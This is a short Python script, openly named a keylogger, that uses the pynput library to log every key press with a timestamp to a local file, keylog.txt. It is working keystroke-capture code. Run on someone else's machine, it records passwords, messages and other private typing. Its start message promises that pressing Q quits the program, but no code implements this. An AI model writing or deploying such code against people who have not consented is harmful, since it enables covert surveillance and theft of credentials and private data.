import logging
from pynput import keyboard

#path to the file
LOG_FILE = "keylog.txt"

# Initialize logging
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s: %(message)s")

#Track the state of each key
pressed_keys = set()

def on_press(key):
    try:
        # Check if the key is not already pressed
        if key not in pressed_keys:
            #Log the key
            logging.info(str(key))
            #Add the key to the set of pressed keys
            pressed_keys.add(key)
    except AttributeError:
        pass

def on_release(key):
    #Remove the key from the set of pressed keys when released
    try:
        pressed_keys.remove(key)
    except KeyError:
        pass

def main():
    print("Keylogger started. Press 'Q' to quit.")

    #Create a listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()